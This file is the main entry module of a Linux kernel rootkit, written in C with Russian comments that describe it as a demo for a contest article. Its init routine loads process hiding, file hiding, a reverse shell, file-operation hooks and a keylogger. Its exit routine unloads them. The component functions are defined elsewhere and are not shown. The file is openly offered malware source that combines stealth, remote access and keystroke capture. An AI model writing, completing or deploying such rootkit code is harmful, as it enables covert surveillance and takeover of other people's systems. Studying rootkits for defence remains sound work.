/*
 *  Демонстрационный проект руткита для Линукс, практический материалл к конкурсной статьи.
 *  В данном модули функции инициализации драйвера и запуск модулей руткита
 */
#include "headers.h"

static int __init rootkit_init(void);
static void __exit rootkit_exit(void);

module_init(rootkit_init);
module_exit(rootkit_exit);

static int __init rootkit_init(void)
{
	int error = 0;

	error = start_rootkit_proc_hide ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module proc_hide succefully loaded !\n");
	}

	error = start_rootkit_file_hide ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module file_hide succefully loaded !\n");
	}

	error = start_reverse_shell_rootkit ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module reverse_shell_rootkit succefully loaded !\n");
	}

	error = init_fops();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module init_fops succefully loaded !\n");
	}

	error = run_keylogger();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module init_keylogger succefully loaded !\n");
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	int error = 0;

	error = stop_rootkit_proc_hide ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module proc_hide succefully unloaded !\n");
	}

	error = stop_rootkit_file_hide ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module file_hide succefully unloaded !\n");
	}

	error = stop_reverse_shell_rootkit ();
	if (error == 0)
	{
		printk(KERN_INFO "+++ Rootkit module reverse_shell_rootkit succefully unloaded !\n");
	}

	stop_keylogger();
	exit_fops();
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X-Shar");
MODULE_VERSION("demo");

